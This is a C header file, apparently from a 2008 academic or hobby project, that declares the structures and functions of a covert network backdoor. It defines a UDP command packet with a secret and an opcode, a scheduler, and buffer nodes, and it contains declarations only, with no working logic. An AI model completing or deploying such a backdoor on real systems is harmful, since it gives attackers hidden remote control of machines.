/*
 * Copyright (C) 2008 Stephen Makonin and Torin Sandall. All rights reserved. 
 */

#ifndef __BACKDOOR_H__
#define __BACKDOOR_H__

typedef struct SCHED_EVENT sched_event;
typedef struct CMD_PKT cmd_pkt;
typedef struct FILE_NODE file_node;
typedef struct BUFFER_NODE buffer_node;

struct SCHED_EVENT {
	int fd;
	char rdbuf[BUFLEN];
	int (*callback)(void *);
	void (*cleanup)(void *);
	void *ptr;
} __attribute__((packed));

struct CMD_PKT {
	struct ether_header eth;
	struct iphdr ipv4;
	struct udphdr udp;
	unsigned long timestamp;
	char secret[8];
    unsigned long addr;
	char opcode;
	char options[0];
} __attribute__((packed));

struct FILE_NODE {
    cmd_pkt *pkt;
    int fd;
} __attribute__ ((packed));

struct BUFFER_NODE {
    cmd_pkt *pkt;
    char buffer[BUFLEN];
    ssize_t len;
} __attribute__ ((packed));

extern int backdoor_init(unsigned int, const char *, const char *);
extern int backdoor_scheduler(unsigned int);
extern int find_active_eth(char *);

#endif

